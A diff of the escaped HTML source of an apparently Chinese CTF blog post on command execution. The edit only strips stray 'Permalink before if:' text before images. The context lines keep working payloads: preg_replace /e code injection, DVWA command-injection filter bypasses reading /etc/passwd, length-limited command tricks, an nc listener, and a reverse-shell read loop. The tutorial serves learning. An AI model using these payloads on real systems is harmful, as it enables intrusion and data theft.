@@ -373,7 +373,7 @@
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>得到&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005160.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005160.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005160.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-2-1">Example 2
@@ -873,7 +873,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">id,$b-&amp;gt;id);}system(&amp;#39;ls&amp;#39;);//
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610003780.jpg&lt;img src="https://blogpic.zdy.one/img/20190610003780.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003780.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-3-2">Example 3
@@ -906,7 +906,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>使用&lt;code>/e&lt;/code>修饰符，&lt;code>preg_replace&lt;/code>会将&lt;code>replacement&lt;/code>参数当作 PHP 代码执行，也就是&lt;code>$_GET['new']&lt;/code>&lt;/p>
 &lt;p>所以用&lt;code>new=system('id');&amp;amp;pattern=/test/e&amp;amp;base=jutst test&lt;/code>，即可执行任意命令。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008506.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008506.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008506.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="file-upload">File Upload
@@ -984,7 +984,7 @@ loading="lazy"
 &lt;/div>&lt;p>于是用&lt;code>%0a&lt;/code>换行执行命令&lt;/p>
 &lt;h4 id="example-3-4">Example 3
 &lt;/h4>&lt;p>直接在后面加貌似会被先过滤跳转，放到 burp 里面加就行了&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008206.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008206.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008206.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看下源代码&lt;/p>
@@ -2026,7 +2026,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里没有对&lt;code>ip&lt;/code>进行输入检测，所以我们可以使用&lt;code>;cmd&lt;/code>的方式进行命令注入。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007771.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>####Command Injection: medium&lt;/p>
@@ -2097,7 +2097,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里仅仅只是增加了&lt;code>&amp;amp;&amp;amp;&lt;/code>与&lt;code>;&lt;/code>两个的过滤。然而我们仍然可以使用&lt;code>|&lt;/code>来进行绕过。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007771.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>####Command Injection: high&lt;/p>
@@ -2182,7 +2182,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里仔细观察，其实&lt;code>|&lt;/code>管道符这里有一个空格，所以我们&lt;code>medium&lt;/code>的&lt;code>payload&lt;/code>还可以继续使用，但是如果真的过滤了&lt;code>|&lt;/code>怎么办呢。我们其实还可以抓包加入&lt;code>%0a&lt;/code>换行符进行一个绕过。使用&lt;code>127.0.0.1 %0acat /etc/passwd&lt;/code>进行绕过&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008189.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008189.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008189.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="command-injection-impossible">Command Injection: impossible
@@ -2407,14 +2407,14 @@ loading="lazy"
 &lt;li>
 &lt;p>在&lt;code>url&lt;/code>的编码绕过&lt;/p>
 &lt;p>这里我&lt;code>fuzz&lt;/code>了一下，&lt;code>Linux bash&lt;/code>可以使用&lt;code>%20(space)&lt;/code>、&lt;code>%09(tab)&lt;/code>、&lt;code>%3c(&amp;lt;)&lt;/code>以及&lt;code>+&lt;/code>来绕过&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004461.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004461.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004461.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>花括号拓展&lt;code>{OS_COMMAND,ARGUMENT}&lt;/code>&lt;/p>
 &lt;p>在&lt;code>Linux bash&lt;/code>中还可以使用&lt;code>{cat,/etc/passwd}&lt;/code>来绕过&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009158.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009158.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009158.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
@@ -2601,7 +2601,7 @@ loading="lazy"
 &lt;h3 id="举个例子-1">举个例子
 &lt;/h3>&lt;h4 id="短命令执行">短命令执行
 &lt;/h4>&lt;p>首先按照前面的&lt;code>&amp;gt;&lt;/code>的用法，我们可以知道有标准输出可以输出到文件，所以&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007866.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007866.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007866.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里我们有两种构造方式:&lt;/p>
@@ -2624,13 +2624,13 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;/li>
 &lt;/ol>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008039.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008039.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008039.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;ol start="2">
 &lt;li>使用&lt;code>\\&lt;/code>，这种方法是利用&lt;code>\&lt;/code>来拼接字符串，其中前一个&lt;code>\&lt;/code>是用来转义后一个&lt;code>\&lt;/code>的。这里需要考虑时间顺序，需要逆序来创建文件。&lt;/li>
 &lt;/ol>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004356.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004356.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004356.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-1七字绕过">Example 1 七字绕过
@@ -2780,7 +2780,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这里需要我们注意的是&lt;code>cmd &amp;lt;= 5&lt;/code>，所以我们就不能在使用&lt;code>ls -t&amp;gt;a&lt;/code>。&lt;/p>
 &lt;p>但是我们还是可以通过比较巧妙的构造来实现&lt;code>ls -t&amp;gt;a&lt;/code>这么一个操作的。可以先通过把&lt;code>ls -t&amp;gt;a&lt;/code>这样拆分成几段写入到&lt;code>_&lt;/code>文件存放。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008919.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008919.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008919.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>从图中我们就可以看到&lt;code>_&lt;/code>里面的内容，第一行无效命令，2-5行因为末尾有&lt;code>\&lt;/code>连接字符的存在所以可以连接字符串形成&lt;code>ls -t&amp;gt;g&lt;/code>，最后一行执行&lt;code>ls&lt;/code>。所以&lt;code>sh _&lt;/code>我们可以得到当前目录&lt;code>ls -t&amp;gt;g&lt;/code>的效果。达到与&lt;code>Example 1&lt;/code>一致的效果，其他步骤与&lt;code>Example 1&lt;/code>类似，就不再赘述了。下面给出&lt;code>Orange&lt;/code>的&lt;code>exp&lt;/code>&lt;/p>
@@ -2912,25 +2912,25 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这题相比之前又难了一点，这次是&lt;code>cmd &amp;lt;= 4&lt;/code>，但是原理还是一样的。我们要处理的问题还是&lt;code>ls -t&amp;gt;g&lt;/code>这么一个问题。然后因为长度限制，如果我们还用&lt;code>\\&lt;/code>作为字符串连接的话，只剩下两个字符，加上最开始必须要用&lt;code>&amp;gt;&lt;/code>创建文件，所以只剩下一个可控字符。所以碰到需要转义空格这种地方例如&lt;code>Exmaple 2&lt;/code>中的&lt;code>&amp;gt;\ \\&lt;/code>这里就不能再使用了。但是我们这里再提一个&lt;code>trick&lt;/code>&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007665.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007665.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007665.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005128.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005128.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005128.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>*&lt;/code> 相当于&lt;code>$(dir *)&lt;/code>,所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入。例如：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009411.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009411.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009411.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以回到题目，如果按照顺序去创建文件，我们会发现如果直接用&lt;code>*&lt;/code>去执行的话，发现并不可以，因为按照&lt;code>dir&lt;/code>的文件排序，&lt;code>-t&lt;/code>也是排在最前面。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008096.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008096.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008096.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以我们还需要参考一下&lt;code>alphabetical&lt;/code>来排序，这里就不要用&lt;code>Docker&lt;/code>来做了，因为&lt;code>busybox&lt;/code>里面一些东西还是跟真实环境优点区别的。&lt;/p>
 &lt;p>所以如果我们需要运用&lt;code>-&lt;/code>字符的话，他会排在最前面，这里就比较坑了。所以我们需要想个办法把&lt;code>-t&lt;/code>置于后面。&lt;/p>
 &lt;p>这里我们可以使用&lt;code>t-&lt;/code>这种逆序的模式把&lt;code>t&lt;/code>放到前面来，就可以比较正常的排序了。&lt;/p>
 &lt;p>逆序的命令我们可以用&lt;code>rev&lt;/code>来实现，另外我们还需要一个字母比较靠前的命令来展示当前目录，我们可以采用&lt;code>dir&lt;/code>来展示当前目录，同时&lt;code>d&lt;/code>字母也比较靠前，不要像&lt;code>ls&lt;/code>特别考虑排序的问题。所以我们大概可以通过这么一个形式去构造&lt;code>ls -t&amp;gt;g&lt;/code>&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008113.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008113.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008113.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里可能有几个让大家比较疑惑的地方，比如为什么是&lt;code>&amp;gt;ht-&lt;/code>，个人理解是因为&lt;code>ls&lt;/code>逆序是&lt;code>sl&lt;/code>，&lt;code>s&lt;/code>是排在&lt;code>t&lt;/code>前的，如果不加&lt;code>h&lt;/code>，&lt;code>t-&lt;/code>会在&lt;code>sl&lt;/code>之后，而且&lt;code>ls -th&lt;/code>与&lt;code>ls -t&lt;/code>效果是一样的，然后我们再找一个&lt;code>h&lt;/code>之前的字母做输出文件就可以了。还有一个地方就是&lt;code>*v&amp;gt;x&lt;/code>，之前我们讲过了通配符以及&lt;code>*&lt;/code>的作用，这里&lt;code>*v&lt;/code>就相当于&lt;code>$(dir *v)&amp;gt;x&lt;/code>，&lt;code>dir *v&lt;/code>返回的就是结尾为&lt;code>v&lt;/code>的文件，这里就是&lt;code>rev&lt;/code>与&lt;code>v&lt;/code>两个文件，如果只有相当于先把&lt;code>v&lt;/code>文件内容进行逆序，而后再输入到&lt;code>x&lt;/code>文件，这样整个&lt;code>ls -t&amp;gt;g&lt;/code>的命令拼凑就完成了，接着方法就有很多种了，比较简单的就是直接&lt;code>wget&lt;/code>或者&lt;code>curl&lt;/code>一个&lt;code>webshell&lt;/code>到服务器上就好了，就不再赘述了。&lt;/p>
@@ -3053,7 +3053,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这个用起来比较简单，直接去查看对应的记录就好了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005118.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005118.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005118.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>有时候你需要编码想要读出来的内容，这样才不会由于一些空格或者什么其他字符导致读不完整数据。&lt;/p>
@@ -3080,10 +3080,10 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -l -n -vv -p &lt;span class="m">53&lt;/span> -u -k&lt;span class="o">(&lt;/span>如果不支持-k也可以不用-k&lt;span class="o">)&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004044.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004044.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004044.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008182.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008182.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008182.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>Same:&lt;/p>
@@ -3290,7 +3290,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ cat &amp;lt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">5&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="nb">read&lt;/span> line&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="nv">$line&lt;/span> 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">5&lt;/span> &amp;gt;&lt;span class="p">&amp;amp;&lt;/span>5&lt;span class="p">;&lt;/span> &lt;span class="k">done&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610003384.jpg&lt;img src="https://blogpic.zdy.one/img/20190610003384.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003384.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>nc&lt;/code>方式&lt;/p>
